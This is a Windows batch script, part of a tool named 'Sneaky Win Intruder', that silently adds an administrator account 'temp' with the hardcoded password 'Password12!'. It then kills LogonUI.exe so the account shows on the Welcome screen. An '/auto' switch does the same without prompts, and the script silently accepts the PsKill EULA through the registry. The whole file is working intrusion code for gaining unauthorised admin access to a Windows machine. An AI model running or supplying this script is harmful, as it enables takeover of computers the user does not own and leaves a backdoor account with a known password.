@echo off

:: ************************
:: Script: A sub script of Sneaky Win Intruder Type I
::         Use this to create new account and refresh Welcome screen.
:: Refer to Swi.bat and Readme.txt
:: ************************

:: Supports an unattended switch, "/auto", used by Swi Type II

if not "%OS%"=="Windows_NT" echo "Windows version not supported" && goto :EOF

SETLOCAL ENABLEDELAYEDEXPANSION

:: debugging options
:: set debug=1
:: set debug2=1
if defined debug echo :: Debugging mode 1 is ON.
if defined debug2 echo on&set debug=1&echo :: Debugging mode 2 is ON.

:: set correct path to Swi folder
cd /d "%windir%\system32"
SET PATH=%PATH%;%cd%\Swi
SET PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC

:: checks if /auto is specified, then do Swi Type II part (same commands, just compacted)
if /i "%~1" NEQ "/auto" goto start
net user temp Password12! /add
net localgroup administrators temp /add
for /f "usebackq tokens=3" %%i in (`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion`) do set winver=%%i
if %winver% GEQ 6 set NewOS=1
taskkill >nul 2>&1
if %errorlevel% EQU 9009 (
	reg add "HKCU\Software\Sysinternals\PsKill" /v "EulaAccepted" /t REG_DWORD /d 0x1 /f
	pskill -t LogonUI.exe
) else (
	taskkill /F /im logonUI.exe
)
if defined NewOS logonUI.exe
goto :EOF

:: Swi Type I part
:start
echo.
echo #  This script will add a temporary administrator account to current Windows
echo.
echo #  Before pressing a key to begin, please write down the logon credentials:
echo.
echo         - Username: temp
echo         - Password: Password12^! ^(Case sensitive!^)
echo.
echo    Note: If the Welcome screen isn't refreshed with the new account, you may
echo          need to hit CTRL+ALT+DEL twice to get to the logon box, or reboot.
echo.
pause
echo.

net user temp Password12! /add
net localgroup administrators temp /add

if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  WARNING: Cannot create account. 
	echo.
	echo #  An account with the same name may already exist.
	echo.
	echo #  If it is not created. you may do it manually thru the GUI or commands:
	echo.
	echo     - net user ^<username^> ^<password^> /add
	echo     - net localgroup administrators ^<username^> /add
	echo.
	echo #  Starting "Local User and Groups" -- the GUI. Please wait...
	echo.
	mmc /b lusrmgr.msc
	pause
)

echo _____________________________________________________________________________
echo 
echo #  Refresh Windows screen? (Default: Y)
echo.
echo #  Do this if you don't see the new account on Welcome screen
echo.
echo #  Don't do this if you see a logon box.
echo.
call _choiceYN.bat "Select your choice: [Y,N]" Y 60
if %errorlevel% NEQ 0 goto finish

:: refreshing...
echo.
echo #  Determining Windows version
echo.
for /f "usebackq tokens=3" %%i in (`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v CurrentVersion`) do set winver=%%i
if %errorlevel% NEQ 0 (
	echo _____________________________________________________________________________
	echo 
	echo #  FATAL ERROR: Cannot query registry for Windows version.
	goto end
)

echo.
echo #  Windows version %winver% detected.
echo.

if %winver% GEQ 6 (
	echo #  Windows %winver% detected -- Vista or Later.
	set NewOS=1
) else (
	echo #  Windows %winver% detected -- XP or former.
)

:: If it is XP, after LogonUI.exe gets closed, it is rerun by system, but this effect may not exist in later OS.

echo.
echo #  Detecting if either taskkill.exe or pskill.exe exists.
echo.

taskkill >nul 2>&1
if %errorlevel% EQU 9009 (
	echo.
	echo #  INFO: taskkill.exe not found in PATH.
	echo.
	goto pskill
)

echo.
echo #  Refreshing welcome screen for new account to show
echo.
taskkill /F /im logonUI.exe
if defined NewOS logonUI.exe
goto finish

:pskill

reg add "HKCU\Software\Sysinternals\PsKill" /v "EulaAccepted" /t REG_DWORD /d 0x1 /f

pskill.exe >nul 2>&1
if %errorlevel% EQU 9009 (
	echo _____________________________________________________________________________
	echo 
	echo #  INFO: pskill.exe also not found in PATH.
	echo.
	echo #  You don't have either taskkill.exe or pskill.exe in PATH.
	echo.
	echo    You have to restart the system for the new account to show.
	echo.
	echo    Get taskkill.exe from XP Pro, or download pskill.exe from Sysinternals.
	echo.
	pause
	goto finish
)

echo.
echo #  Refreshing welcome screen for new account to show
echo.
:: the reason not to use wkill here is it shows error under Win7.
pskill -t LogonUI.exe
if defined NewOS logonUI.exe

:finish
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo #  Successfully created temporary account
:end
ENDLOCAL
echo.
echo #  Script will exit.
echo.
pause
